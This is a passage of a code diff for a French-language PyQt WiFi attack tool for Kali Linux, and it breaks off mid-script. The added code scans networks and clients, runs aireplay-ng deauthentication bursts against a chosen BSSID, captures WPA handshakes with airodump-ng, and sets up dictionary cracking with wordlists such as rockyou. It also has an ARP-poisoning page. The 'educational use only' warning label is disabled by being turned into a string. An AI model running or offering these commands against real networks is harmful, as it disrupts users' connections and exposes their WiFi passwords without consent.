 
-    def _detect_system(self):
-        class W(QThread):
-            done=pyqtSignal(object)
-            def run(self):
-                def sh(c):
-                    r=subprocess.run(c,shell=True,capture_output=True,
-                                     text=True,timeout=5)
-                    return r.stdout.strip()
-                distro=sh(
-                    "cat /etc/os-release 2>/dev/null"
-                    "|grep PRETTY_NAME|cut -d= -f2|tr -d '\"'"
-                ) or "Kali Linux"
-                kernel=sh("uname -r"); user=sh("whoami")
-                ifaces=[x.strip() for x in sh(
-                    "iw dev 2>/dev/null|awk '/Interface/{print $2}'"
-                ).splitlines() if x.strip()]
-                if not ifaces:
-                    ifaces=[x.strip() for x in sh(
-                        "ip link show|grep -E '^[0-9]+'|"
-                        "awk -F': ' '{print $2}'|grep -v lo"
-                    ).splitlines() if x.strip()]
-                # Statut NetworkManager
-                nm_active=sh("systemctl is-active NetworkManager")
-                # Statut mode moniteur
-                mon_active=bool(sh("iw dev wlan0mon info 2>/dev/null"))
-                self.done.emit((distro[:20],kernel,user,ifaces,nm_active,mon_active))
-        self._dw=W()
-        def on(r):
-            distro,kernel,user,ifaces,nm_active,mon_active=r
-            self._side.set_sys("OS",distro)
-            self._side.set_sys("Kernel",kernel)
-            self._side.set_sys("User",user)
-            if ifaces:
-                self._side.set_ifaces(ifaces)
-                self._ov.set_ifaces(ifaces)
-            self._lp.log(f"{distro} · {user}","ok")
-            # Alertes NetworkManager
-            if mon_active:
-                self._lp.log("⚠ wlan0mon actif — nmcli limité","warn")
-                self._lp.log("  → Phase1 Étape2 → 🔄 Restaurer NM","warn")
-            elif nm_active != "active":
-                self._lp.log("⚠ NetworkManager arrêté","warn")
-                self._lp.log("  → Scans nmcli indisponibles","warn")
-                self._lp.log("  → Cliquez 🔄 Restaurer NM (Phase1)","warn")
+        self.terminal = QTextEdit()
+        self.terminal.setReadOnly(True)
+        self.terminal.setMaximumHeight(160)
+        splitter.addWidget(self.terminal)
+
+        tbl_box = QGroupBox("Réseaux détectés")
+        tbl_lay = QVBoxLayout(tbl_box)
+        self.table = QTableWidget(0, 6)
+        self.table.setHorizontalHeaderLabels([
+            "SSID", "BSSID", "Signal", "Sécurité", "Canal", "Action"
+        ])
+        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
+        self.table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
+        for col, w in [(1,140),(2,70),(4,100),(5,80)]:
+            self.table.setColumnWidth(col, w)
+        self.table.setWordWrap(False)
+        self.table.verticalHeader().setVisible(False)
+        self.table.setEditTriggers(QTableWidget.NoEditTriggers)
+        self.table.setAlternatingRowColors(True)
+        tbl_lay.addWidget(self.table)
+        splitter.addWidget(tbl_box)
+
+        splitter.setSizes([160, 500])
+        lay.addWidget(splitter, stretch=1)
+
+        self.status = QLabel("Prêt — utilisez les boutons en bas pour lancer le scan")
+        self.status.setStyleSheet("color:#888; font-size:11px;")
+        lay.addWidget(self.status)
+
+    def log(self, txt):
+        self.terminal.append(txt)
+
+    def _set_busy(self, busy):
+        self.status.setText("Scan en cours..." if busy else "Terminé")
+
+    def scan_nmcli(self):
+        """Scan rapide via nmcli — NE coupe PAS le réseau Kali."""
+        self.table.setRowCount(0)
+        self.terminal.clear()
+        self._set_busy(True)
+        self.log(f"<span style='color:{COLORS['success']};'>Scan nmcli — réseau Kali NON affecté...</span>")
+
+        cmd = nm_fix_wrap(
+            "nmcli -f SSID,BSSID,SIGNAL,CHAN,RATE,SECURITY dev wifi list 2>&1"
+        )
+        self.thread = ScanThread(cmd)
+        self.thread.output.connect(self.log)
+        self.thread.result.connect(self._load_results)
+        self.thread.start()
+
+    def enable_monitor(self):
+        """Crée interface moniteur virtuelle sans couper wlan0."""
+        iface = self.iface_edit.text().strip()
+        self.log(
+            f"<span style='color:{COLORS['warning']};'>"
+            f"Création interface moniteur virtuelle mon0 (sans couper {iface})...</span>"
+        )
+        cmd = (
+            f"sudo iw dev mon0 del 2>/dev/null; "
+            f"sudo iw dev {iface} interface add mon0 type monitor && "
+            f"sudo ip link set mon0 up && "
+            f"echo 'Interface mon0 créée — WiFi Kali NON affecté'"
+        )
+        self.thread = CmdThread(cmd)
+        self.thread.output.connect(self.log)
+        self.thread.finished.connect(self._on_monitor_done)
+        self.thread.start()
+
+    def _on_monitor_done(self, ok, msg):
+        if ok:
+            self.log(f"<span style='color:{COLORS['success']};'>Interface mon0 active</span>")
+            self.iface_edit.setText("mon0")
+        else:
+            self.log(f"<span style='color:{COLORS['danger']};'>Erreur moniteur : {msg}</span>")
+
+    def scan_airodump(self):
+        """Scan passif via airodump-ng sur interface moniteur."""
+        iface = self.iface_edit.text().strip()
+        secs  = self.time_spin.value()
+        self.table.setRowCount(0)
+        self.terminal.clear()
+        self._set_busy(True)
+        self.status.setText(f"Scan airodump-ng sur {iface} ({secs}s)...")
+
+        cmd = (
+            f"bash -c '"
+            f"if iw dev {iface} info >/dev/null 2>&1; then "
+            f"  echo \"Interface {iface} trouvée\"; "
+            f"  sudo timeout {secs} airodump-ng {iface} 2>&1; "
+            f"else "
+            f"  echo \"Interface {iface} introuvable — cliquez Activer mode moniteur\"; "
+            f"  iw dev 2>&1 | grep Interface; "
+            f"fi'"
+        )
+        self.thread = ScanThread(cmd)
+        self.thread.output.connect(self.log)
+        self.thread.result.connect(self._load_results)
+        self.thread.start()
+
+    def restore_nm(self):
+        """Restaure NetworkManager si airmon-ng l'avait tué."""
+        self.log(f"<span style='color:{COLORS['success']};'>Restauration NetworkManager...</span>")
+        cmd = (
+            "bash -c '"
+            "sudo iw dev mon0 del 2>/dev/null || true; "
+            "sudo airmon-ng stop wlan0mon 2>/dev/null || true; "
+            "sudo systemctl restart NetworkManager; sleep 3; "
+            "sudo nmcli device set wlan0 managed yes 2>/dev/null || true; "
+            "NM=$(systemctl is-active NetworkManager); echo \"NetworkManager: $NM\"; "
+            "nmcli dev status 2>&1 | grep -E \"wlan|wifi\" || true'"
+        )
+        self.thread = CmdThread(cmd)
+        self.thread.output.connect(self.log)
+        self.thread.finished.connect(lambda ok, m:
+            self.log(f"<span style='color:{COLORS['success']};'>NetworkManager restauré</span>"))
+        self.thread.start()
+
+    def stop_scan(self):
+        if self.thread: self.thread.stop()
+        self._set_busy(False)
+        self.status.setText("Scan arrêté")
+
+    def _load_results(self, nets):
+        """Remplit le tableau avec les réseaux détectés."""
+        self._set_busy(False)
+
+        if not nets:
+            self.status.setText("Aucun réseau détecté — vérifiez l'interface")
+            self.log(f"<span style='color:{COLORS['warning']};'>Aucun réseau parsé.</span>")
+            return
+
+        self.table.setRowCount(len(nets))
+        for i, n in enumerate(nets):
+            sec = n.get("security", "Open")
+            sig = n.get("signal", 0)
+            chan = str(n.get("channel", "?"))
+
+            # Signal en %
+            sig_str = f"{sig}%" if isinstance(sig, int) and sig <= 100 else f"-{sig} dBm"
+
+            # Canal + fréquence
+            freq = ""
+            if chan.isdigit():
+                ch_n = int(chan)
+                if ch_n <= 14:   freq = "2.4 GHz"
+                elif ch_n <= 64: freq = "5 GHz"
+                else:            freq = "5 GHz"
+            chan_str = f"{chan}  {freq}" if freq else chan
+
+            # Couleur sécurité
+            sec_low = sec.lower()
+            if not sec_low or "open" in sec_low:
+                sec_col = COLORS['danger']
+            elif "wep" in sec_low:
+                sec_col = "#f59e0b"
+            elif "wpa3" in sec_low:
+                sec_col = COLORS['success']
+            elif "wpa2" in sec_low:
+                sec_col = "#3b82f6"
             else:
-                self._lp.log("✅ NetworkManager actif","ok")
-        self._dw.done.connect(on); self._dw.start()
+                sec_col = COLORS['warning']
 
-# ══════════════════════════════════════════════════════════════════
-#  MAIN
-# ══════════════════════════════════════════════════════════════════
+            # Niveau risque
+            if not sec_low or "open" in sec_low:
+                risque = "ÉLEVÉ"
+            elif "wep" in sec_low:
+                risque = "CRITIQUE"
+            elif "wpa3" in sec_low:
+                risque = "Faible"
+            else:
+                risque = "Modéré"
+
+            def it(txt, align=Qt.AlignLeft | Qt.AlignVCenter):
+                item = QTableWidgetItem(str(txt))
+                item.setTextAlignment(align)
+                return item
+
+            self.table.setItem(i, 0, it(n.get("ssid", "<hidden>")))
+            self.table.setItem(i, 1, it(n.get("bssid", "?")))
+            self.table.setItem(i, 2, it(sig_str, Qt.AlignCenter))
+
+            sec_item = QTableWidgetItem(f"{sec}  [{risque}]")
+            sec_item.setForeground(QColor(sec_col))
+            sec_item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
+            self.table.setItem(i, 3, sec_item)
+
+            self.table.setItem(i, 4, it(chan_str, Qt.AlignCenter))
+
+            # Bouton Sélectionner
+            sel_btn = QPushButton("Sélect.")
+            sel_btn.setStyleSheet(
+                f"background:transparent; border:1px solid {COLORS['accent']};"
+                f"color:{COLORS['accent']}; padding:2px 8px; border-radius:3px; font-size:10px;"
+            )
+            sel_btn.clicked.connect(lambda _, nw=n: self._select(nw))
+            self.table.setCellWidget(i, 5, sel_btn)
+
+        self.table.resizeRowsToContents()
+        self._nets = nets
+        self.status.setText(f"{len(nets)} réseaux détectés")
+        self.log(
+            f"<span style='color:{COLORS['success']};'>"
+            f"✅ {len(nets)} réseaux chargés dans le tableau.</span>"
+        )
+        self.networks_updated.emit(nets)
+
+    def _select(self, n):
+        sec = n.get('security', '?')
+        self.log(
+            f"<span style='color:{COLORS['accent']};'>Sélectionné : "
+            f"<b>{n.get('ssid','?')}</b>  |  BSSID: {n.get('bssid','?')}  |  "
+            f"Sécu: {sec}  |  Canal: {n.get('channel','?')}  |  "
+            f"Signal: {n.get('signal','?')}%</span>"
+        )
+
+    def get_nets(self):
+        return self._nets
+
+
+# ==================== ONGLET ATTAQUES ====================
+class TabAttaques(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.thread = None
+        self._build()
+
+    def _scan_clients(self):
+        """Scanne les clients connectés — affiche dans T1, navigue sur page WPA."""
+        bssid = self.w_bssid.text().strip()
+        iface = self.w_iface.text().strip()
+        chan  = self.w_channel.text().strip()
+
+        if not bssid or bssid == "XX:XX:XX:XX:XX:XX":
+            self.w_status.setText("⚠ Sélectionnez d'abord un réseau cible depuis le Scanner")
+            return
+
+        # Naviguer sur la page WPA pour voir le Terminal 1
+        self.show_page(2)
+
+        # Vider T1 et afficher le scan
+        self.w_t1.clear()
+        self.w_t1.append(
+            f"<span style='color:{COLORS['accent']};'>"
+            f"🔍 Scan clients sur {bssid} — Canal:{chan} — Interface:{iface} (15s)...</span><br>"
+        )
+        self.w_status.setText("🔍 Scan clients en cours (15s)...")
+
+        cmd = (
+            f"bash -c '"
+            f"if ! iw dev {iface} info >/dev/null 2>&1; then "
+            f"  sudo iw dev wlan0 interface add mon0 type monitor 2>/dev/null; "
+            f"  sudo ip link set mon0 up 2>/dev/null; "
+            f"  IFACE=mon0; "
+            f"else IFACE={iface}; fi; "
+            f"sudo timeout 15 airodump-ng --bssid {bssid} -c {chan} $IFACE 2>&1'"
+        )
+        self._scan_client_thread = CmdThread(cmd)
+        self._scan_client_thread.output.connect(self.w_t1.append)
+        self._scan_client_thread.finished.connect(
+            lambda ok, raw: self._parse_clients(raw)
+        )
+        self._scan_client_thread.start()
+
+    def _parse_clients(self, raw):
+        """Parse airodump-ng pour extraire les clients et remplir le combo."""
+        import re as _re
+        self.w_client_combo.clear()
+        self.w_client_combo.addItem(
+            "FF:FF:FF:FF:FF:FF  (tous les clients — broadcast)",
+            "FF:FF:FF:FF:FF:FF"
+        )
+        bssid = self.w_bssid.text().strip()
+        count = 0
+        in_station = False
+        for line in strip_ansi(raw).splitlines():
+            if "STATION" in line and "BSSID" in line:
+                in_station = True; continue
+            if not in_station: continue
+            parts = line.split()
+            if len(parts) >= 2:
+                ap_mac   = parts[0].strip()
+                sta_mac  = parts[1].strip()
+                if not _re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', ap_mac):
+                    continue
+                if not _re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', sta_mac):
+                    continue
+                # Afficher dans T1
+                self.w_t1.append(
+                    f"<span style='color:{COLORS['success']};'>"
+                    f"✅ Client : {sta_mac}  (connecté à {ap_mac})</span>"
+                )
+                self.w_client_combo.addItem(
+                    f"{sta_mac}  ← client connecté",
+                    sta_mac
+                )
+                count += 1
+        msg = (f"✅ {count} client(s) détecté(s) — sélectionnez dans la liste"
+               if count else "⚠ Aucun client détecté — vérifiez BSSID/canal/interface")
+        self.w_status.setText(msg)
+        self.w_t1.append(
+            f"<span style='color:{COLORS['accent']};'><br>{msg}</span>"
+        )
+
+    def update_networks(self, nets):
+        """Appelé quand le scanner détecte de nouveaux réseaux."""
+        self.net_combo.clear()
+        self.net_combo.addItem("— Sélectionner un réseau cible depuis le scan —")
+        for n in nets:
+            ssid  = n.get("ssid", "<hidden>")
+            bssid = n.get("bssid", "?")
+            sec   = n.get("security", "?")
+            chan  = str(n.get("channel", "?"))
+            self.net_combo.addItem(f"{ssid}  |  {bssid}  |  {sec}  |  Ch:{chan}", n)
+
+    def _on_net_selected(self, idx):
+        """Auto-rempli les champs avec le réseau sélectionné."""
+        if idx <= 0: return
+        n = self.net_combo.itemData(idx)
+        if not n: return
+        bssid = n.get("bssid", "")
+        chan  = str(n.get("channel", "6"))
+        ssid  = n.get("ssid", "")
+        # Remplir Deauth
+        self.d_bssid.setText(bssid)
+        # Remplir WPA
+        self.w_bssid.setText(bssid)
+        self.w_channel.setText(chan)
+        # Remplir Dictionnaire
+        self.di_bssid.setText(bssid)
+        self.di_ssid.setText(ssid)
+
+    def _build(self):
+        lay = QVBoxLayout(self)
+        lay.setContentsMargins(10, 10, 10, 10)
+
+        hdr = QLabel("SIMULATION D'ATTAQUES WIFI")
+        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['danger']};")
+        lay.addWidget(hdr)
+        """
+        warn = QLabel(
+            "⚠️  Usage éducatif uniquement — sur vos propres équipements en environnement de test."
+        )
+        warn.setStyleSheet(f"color:{COLORS['warning']}; font-size:11px; font-weight:bold;")
+        lay.addWidget(warn)
+        """
+        # ── Sélecteur réseau cible (depuis scan) ──
+        net_box = QGroupBox("Réseau cible — sélectionner depuis le scan WiFi")
+        net_lay = QHBoxLayout(net_box)
+        self.net_combo = QComboBox()
+        self.net_combo.addItem("— Lancez d'abord le Scanner WiFi puis sélectionnez —")
+        self.net_combo.setSizePolicy(
+            self.net_combo.sizePolicy().horizontalPolicy(),
+            self.net_combo.sizePolicy().verticalPolicy()
+        )
+        self.net_combo.currentIndexChanged.connect(self._on_net_selected)
+        net_lay.addWidget(self.net_combo, stretch=1)
+        lay.addWidget(net_box)
+
+        # ── QStackedWidget pour sous-pages ──
+        self.stack = QStackedWidget()
+
+        # ── Page 0 : Deauth ──
+        deauth_w = QWidget()
+        d_lay = QVBoxLayout(deauth_w)
+        d_desc = QLabel(
+            "Attaque de désauthentification (Deauth)\n"
+            "Envoie des trames 802.11 qui forcent les clients à se déconnecter du point d'accès.\n"
+            "But : démontrer la vulnérabilité des réseaux sans 802.11w (MFP)."
+        )
+        d_desc.setWordWrap(True)
+        d_desc.setStyleSheet("color:#888; font-size:11px;")
+        d_lay.addWidget(d_desc)
+
+        d_cfg = QGroupBox("Paramètres")
+        d_form = QFormLayout(d_cfg)
+        self.d_iface  = QLineEdit("wlan0mon")
+        self.d_bssid  = QLineEdit("XX:XX:XX:XX:XX:XX")
+        self.d_client = QLineEdit("FF:FF:FF:FF:FF:FF")
+        self.d_count  = QSpinBox()
+        self.d_count.setRange(0, 1000); self.d_count.setValue(10)
+        self.d_count.setSpecialValueText("Continu (0)")
+        d_form.addRow("Interface (monitor) :", self.d_iface)
+        d_form.addRow("BSSID cible (AP) :", self.d_bssid)
+        d_form.addRow("Client MAC (FF=tous) :", self.d_client)
+        d_form.addRow("Nombre de paquets :", self.d_count)
+        d_lay.addWidget(d_cfg)
+
+        self.d_cmd_preview = QLabel()
+        self.d_cmd_preview.setStyleSheet(
+            "background:#161b22; border:1px solid #30363d; border-radius:4px;"
+            "padding:6px 10px; font-family:Consolas; color:#c9d1d9; font-size:11px;"
+        )
+        self.d_cmd_preview.setWordWrap(True)
+        d_lay.addWidget(self.d_cmd_preview)
+
+        self.d_terminal = QTextEdit(); self.d_terminal.setReadOnly(True)
+        d_lay.addWidget(self.d_terminal, stretch=1)
+        self.stack.addWidget(deauth_w)
+
+        # ── Page 1 : ARP Poisoning ──
+        arp_w = QWidget()
+        a_lay = QVBoxLayout(arp_w)
+        a_desc = QLabel(
+            "Attaque ARP Poisoning (Man-in-the-Middle)\n"
+            "Empoisonne les tables ARP du client et du routeur pour intercepter tout le trafic.\n"
+            "But : démontrer l'interception de données sur réseau non chiffré."
+        )
+        a_desc.setWordWrap(True)
+        a_desc.setStyleSheet("color:#888; font-size:11px;")
+        a_lay.addWidget(a_desc)
+
+        a_cfg = QGroupBox("Paramètres")
+        a_form = QFormLayout(a_cfg)
+        self.a_iface  = QLineEdit("wlan0")
+        self.a_target = QLineEdit("192.168.1.X")
+        self.a_router = QLineEdit("192.168.1.1")
+        a_form.addRow("Interface :", self.a_iface)
+        a_form.addRow("IP cible (victime) :", self.a_target)
+        a_form.addRow("IP routeur (gateway) :", self.a_router)
+        a_lay.addWidget(a_cfg)
+
+        self.a_terminal = QTextEdit(); self.a_terminal.setReadOnly(True)
+        a_lay.addWidget(self.a_terminal, stretch=1)
+        self.stack.addWidget(arp_w)
+
+        # ── Page 2 : WPA Handshake ──
+        wpa_w = QWidget()
+        w_lay = QVBoxLayout(wpa_w)
+        w_lay.setContentsMargins(6, 6, 6, 6)
+        w_lay.setSpacing(0)
+
+        # ── Splitter VERTICAL : config (haut) ↕ terminaux (bas) ──
+        w_vsplit = QSplitter(Qt.Vertical)
+        w_vsplit.setHandleWidth(6)
+        w_vsplit.setStyleSheet(
+            f"QSplitter::handle:vertical {{"
+            f"  background: {COLORS['border']}; height: 6px; }}"
+            f"QSplitter::handle:vertical:hover {{"
+            f"  background: {COLORS['accent']}; }}"
+        )
+
+        # ── Partie haute : config ──
+        w_top = QWidget()
+        w_top_lay = QVBoxLayout(w_top)
+        w_top_lay.setContentsMargins(0, 2, 0, 2)
+        w_top_lay.setSpacing(4)
+
+        # Instructions supprimées — remplacées par statut compact
+        w_cfg = QGroupBox("Paramètres")
+        w_form = QFormLayout(w_cfg)
+        self.w_iface   = QLineEdit("wlan0mon")
+        self.w_bssid   = QLineEdit("XX:XX:XX:XX:XX:XX")
+        self.w_channel = QLineEdit("6")
+        self.w_wordlist= QLineEdit(DEFAULT_WORDLIST)
+
+        # ── Sélecteur client connecté (BSSID client) ──
+        client_row = QWidget()
+        cl_lay = QHBoxLayout(client_row)
+        cl_lay.setContentsMargins(0, 0, 0, 0); cl_lay.setSpacing(6)
+        self.w_client_combo = QComboBox()
+        self.w_client_combo.addItem("FF:FF:FF:FF:FF:FF  (tous les clients — broadcast)")
+        self.w_client_combo.setToolTip(
+            "Sélectionner un client spécifique pour le deauth ciblé.\n"
+            "FF:FF:FF:FF:FF:FF = déconnecter TOUS les clients."
+        )
+        cl_lay.addWidget(self.w_client_combo, stretch=1)
+        btn_scan_clients = QPushButton("🔍")
+        btn_scan_clients.setFixedSize(34, 30)
+        btn_scan_clients.setToolTip("Détecter les clients connectés au BSSID cible")
+        btn_scan_clients.setStyleSheet(
+            f"background:{COLORS['input']}; border:1px solid {COLORS['border']};"
+            f"border-radius:4px; color:{COLORS['warning']}; font-size:14px;"
+        )
+        btn_scan_clients.clicked.connect(self._scan_clients)
+        cl_lay.addWidget(btn_scan_clients)
+
+        # ── Sélecteur fichier .cap existant ──
+        cap_sel_row = QWidget()
+        cap_sel_lay = QHBoxLayout(cap_sel_row)
+        cap_sel_lay.setContentsMargins(0, 0, 0, 0); cap_sel_lay.setSpacing(6)
+        self.w_cap_combo = QComboBox()
+        self.w_cap_combo.addItem("— Nouveau fichier (créé automatiquement) —", None)
+        self.w_cap_combo.setToolTip("Sélectionner un .cap existant pour crack direct")
+        cap_sel_lay.addWidget(self.w_cap_combo, stretch=1)
+        btn_refresh = QPushButton("🔄")
+        btn_refresh.setFixedSize(34, 30)
+        btn_refresh.setToolTip("Rafraîchir la liste des .cap")
+        btn_refresh.setStyleSheet(
+            f"background:{COLORS['input']}; border:1px solid {COLORS['border']};"
+            f"border-radius:4px; color:{COLORS['accent']}; font-size:14px;"
+        )
+        btn_refresh.clicked.connect(self._refresh_cap_list)
+        cap_sel_lay.addWidget(btn_refresh)
+
+        w_form.addRow("Interface (monitor) :", self.w_iface)
+        w_form.addRow("BSSID réseau cible :", self.w_bssid)
+        w_form.addRow("Canal :", self.w_channel)
+        w_form.addRow("Client connecté :", client_row)
+        w_form.addRow("Wordlist :", self.w_wordlist)
+        w_form.addRow("Fichier .cap existant :", cap_sel_row)
+        w_top_lay.addWidget(w_cfg)
+
+        # ── Boîte résultat vérification handshake (étape 5) ──
+        verif_box = QGroupBox("Étape 5 — Résultat vérification handshake")
+        verif_box.setStyleSheet(
+            f"QGroupBox {{ border:1px solid {COLORS['success']}; border-radius:4px; "
+            f"margin-top:10px; padding-top:6px; }}"
+            f"QGroupBox::title {{ color:{COLORS['success']}; font-weight:bold; padding:0 6px; }}"
+        )
+        verif_lay = QVBoxLayout(verif_box)
+        verif_lay.setContentsMargins(6, 4, 6, 6)
+        self.w_verif_result = QTextEdit()
+        self.w_verif_result.setReadOnly(True)
+        self.w_verif_result.setMaximumHeight(60)
+        self.w_verif_result.setPlaceholderText(
+            "Résultat vérification handshake...\n"
+            "Exemple :  1  94:0E:6B:88:BE:7F  manda  WPA (1 handshake)"
+        )
+        self.w_verif_result.setStyleSheet(
+            "background:#0d1117; color:#3fb950; "
+            "font-family:Consolas,monospace; font-size:11px; "
+            "border:none;"
+        )
+        verif_lay.addWidget(self.w_verif_result)
+        w_top_lay.addWidget(verif_box)
+
+        self._refresh_cap_list()
+
+        # Statut global
+        self.w_status = QLabel("Prêt — sélectionnez un réseau depuis le Scanner puis cliquez Lancer")
+        self.w_status.setStyleSheet(f"color:#888; font-size:11px;")
+        w_top_lay.addWidget(self.w_status)
+
+        w_vsplit.addWidget(w_top)
+
+        # ── Partie basse : 3 terminaux ──
+        w_bot = QWidget()
+        w_bot_lay = QVBoxLayout(w_bot)
+        w_bot_lay.setContentsMargins(0, 0, 0, 0)
+
+        self.w_splitter = QSplitter(Qt.Horizontal)
+        self.w_splitter.setHandleWidth(5)
+        self.w_splitter.setStyleSheet(
+            f"QSplitter::handle:horizontal {{"
+            f"  background: {COLORS['border']}; width: 5px; }}"
+            f"QSplitter::handle:horizontal:hover {{"
+            f"  background: {COLORS['accent']}; }}"
+        )
+
+        def make_term_box(title, color):
+            box = QGroupBox(title)
+            box.setStyleSheet(
+                f"QGroupBox {{ border:1px solid {color}; border-radius:4px; "
+                f"margin-top:10px; padding-top:6px; }}"
+                f"QGroupBox::title {{ color:{color}; font-size:10px; "
+                f"font-weight:bold; padding:0 6px; }}"
+            )
+            lay = QVBoxLayout(box)
+            lay.setContentsMargins(4, 4, 4, 4)
+            t = QTextEdit()
+            t.setReadOnly(True)
+            t.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
+            t.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
+            t.setStyleSheet(
+                "background:#0d1117; color:#c9d1d9; "
+                "font-family:Consolas,monospace; font-size:10px; "
+                "border:none;"
+            )
+            lay.addWidget(t)
+            return box, t
+
+        box1, self.w_t1 = make_term_box("// TERMINAL 1 — CAPTURE HANDSHAKE",  COLORS['accent'])
+        box2, self.w_t2 = make_term_box("// TERMINAL 2 — DEAUTH",             COLORS['danger'])
+        box3, self.w_t3 = make_term_box("// TERMINAL 3 — CRACK DICTIONNAIRE", "#7c3aed")
+
+        self.w_splitter.addWidget(box1)
+        self.w_splitter.addWidget(box2)
+        self.w_splitter.addWidget(box3)
+        self.w_splitter.setSizes([400, 400, 400])
+
+        w_bot_lay.addWidget(self.w_splitter)
+        w_vsplit.addWidget(w_bot)
+
+        # Taille initiale : config compact, terminaux = max espace
+        w_vsplit.setSizes([220, 800])
+        w_vsplit.setStretchFactor(0, 0)
+        w_vsplit.setStretchFactor(1, 1)
+
+        w_lay.addWidget(w_vsplit, stretch=1)
+
+        self.stack.addWidget(wpa_w)
+
+        # Stocker les threads des 3 terminaux
+        self._wpa_threads = []
+
+        # ── Page 3 : Attaque Dictionnaire ──
+        dict_w = QWidget()
+        di_lay = QVBoxLayout(dict_w)
+        di_desc = QLabel(
+            "Attaque par dictionnaire — crack offline du hash WPA\n"
+            "Teste une liste de mots de passe contre un fichier .cap contenant le handshake.\n"
+            "But : démontrer qu'un mot de passe simple est cassé en quelques secondes."
+        )
+        di_desc.setWordWrap(True)
+        di_desc.setStyleSheet("color:#888; font-size:11px;")
+        di_lay.addWidget(di_desc)
+
+        di_cfg = QGroupBox("Paramètres")
+        di_form = QFormLayout(di_cfg)
+
+        # Champ fichier .cap + bouton de capture à droite
+        cap_row = QWidget()
+        cap_lay = QHBoxLayout(cap_row)
+        cap_lay.setContentsMargins(0, 0, 0, 0)
+        cap_lay.setSpacing(6)
+        self.di_capfile = QLineEdit()
+        self.di_capfile.setPlaceholderText("Cliquez 📡 pour capturer, ou entrez le chemin manuellement")
+        # Chercher le cap le plus récent dans APP_DIR
+        import glob as _g
+        _caps = sorted(_g.glob(os.path.join(APP_DIR, "handshake_*.cap")), reverse=True)
+        if _caps:
+            self.di_capfile.setText(_caps[0])
+        else:
+            self.di_capfile.setText("")
+        cap_lay.addWidget(self.di_capfile, stretch=1)
+        self.btn_cap_auto = QPushButton("📡 Capturer maintenant")
+        self.btn_cap_auto.setFixedHeight(32)
+        self.btn_cap_auto.setStyleSheet(
+            f"background:{COLORS['warning']}; color:#000; "
+            f"border-radius:4px; font-weight:bold; padding:0 10px; font-size:11px;"
+        )
+        self.btn_cap_auto.clicked.connect(self._capture_for_dict)
+        cap_lay.addWidget(self.btn_cap_auto)
+
+        self.di_wordlist = QLineEdit(DEFAULT_WORDLIST)
+        self.di_bssid    = QLineEdit("XX:XX:XX:XX:XX:XX")
+        self.di_ssid     = QLineEdit("")
+        di_form.addRow("Fichier .cap (handshake) :", cap_row)
+        di_form.addRow("Wordlist :", self.di_wordlist)
+        di_form.addRow("BSSID cible :", self.di_bssid)
+        di_form.addRow("SSID (optionnel) :", self.di_ssid)
+        di_lay.addWidget(di_cfg)
+
+        # Aperçu commande
+        self.di_cmd_preview = QLabel()
+        self.di_cmd_preview.setStyleSheet(
+            "background:#161b22; border:1px solid #30363d; border-radius:4px;"
+            "padding:6px 10px; font-family:Consolas; color:#c9d1d9; font-size:11px;"
+        )
+        self.di_cmd_preview.setWordWrap(True)
+        di_lay.addWidget(self.di_cmd_preview)
+
+        # Info wordlists disponibles
+        info = QLabel(
+            "Wordlists disponibles sur Kali :  "
+            "/usr/share/wordlists/rockyou.txt  |  "
+            "/usr/share/wordlists/fasttrack.txt  |  "
+            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
+        )
+        info.setStyleSheet("color:#555; font-size:10px;")
+        info.setWordWrap(True)
+        di_lay.addWidget(info)
+
+        self.di_terminal = QTextEdit(); self.di_terminal.setReadOnly(True)
+        di_lay.addWidget(self.di_terminal, stretch=1)
+        self.stack.addWidget(dict_w)
+
+        # Connecter preview dictionnaire
+        for w in [self.di_capfile, self.di_wordlist, self.di_bssid]:
+            w.textChanged.connect(self._update_dict_preview)
+        self._update_dict_preview()
+
+        lay.addWidget(self.stack, stretch=1)
+
+        # Update deauth preview on change
+        for w in [self.d_iface, self.d_bssid, self.d_client]:
+            w.textChanged.connect(self._update_deauth_preview)
+        self.d_count.valueChanged.connect(self._update_deauth_preview)
+        self._update_deauth_preview()
+
+    def _capture_for_dict(self):
+        """Bouton 📡 — capture rapide depuis la page Dictionnaire."""
+        bssid = self.di_bssid.text().strip()
+        iface = self.w_iface.text().strip()   # ex: wlan0mon
+        chan  = self.w_channel.text().strip()
+
+        if not bssid or bssid == "XX:XX:XX:XX:XX:XX":
+            self.di_terminal.append(
+                f"<span style='color:{COLORS['danger']};'>"
+                f"⚠ Sélectionnez d'abord un réseau cible depuis le Scanner.</span>"
+            )
+            return
+
+        # Déduire l'interface de base (wlan0 depuis wlan0mon)
+        base_iface = iface.replace("mon", "") if iface.endswith("mon") else iface
+
+        cap_prefix = os.path.join(APP_DIR, "handshake")
+
+        # Script bash complet avec activation moniteur automatique
+        script = (
+            "BSSID='{bssid}'\n"
+            "CHAN='{chan}'\n"
+            "BASE='{base}'\n"
+            "IFACE='{iface}'\n"
+            "OUT='{prefix}_'$(date +%Y%m%d_%H%M%S)\n"
+            "\n"
+            "# Activer mode moniteur si pas actif\n"
+            "if ! iw dev $IFACE info >/dev/null 2>&1; then\n"
+            "  echo '⚙ Activation mode moniteur sur '$BASE'...'\n"
+            "  sudo iw dev $BASE interface add mon0 type monitor 2>/dev/null\n"
+            "  sudo ip link set mon0 up 2>/dev/null\n"
+            "  IFACE=mon0\n"
+            "  sleep 2\n"
+            "fi\n"
+            "\n"
+            "echo '📡 Interface utilisée : '$IFACE\n"
+            "echo '⏳ Démarrage capture → '$OUT'-01.cap'\n"
+            "sudo airodump-ng -c $CHAN --bssid $BSSID -w $OUT --output-format cap $IFACE &\n"
+            "DUMP_PID=$!\n"
+            "sleep 5\n"
+            "echo '💥 Envoi deauth (30 paquets) pour forcer reconnexion...'\n"
+            "sudo aireplay-ng --deauth 30 -a $BSSID $IFACE\n"
+            "sleep 8\n"
+            "echo '💥 2ème vague deauth...'\n"
+            "sudo aireplay-ng --deauth 20 -a $BSSID $IFACE\n"
+            "sleep 5\n"
+            "kill $DUMP_PID 2>/dev/null\n"
+            "sleep 2\n"
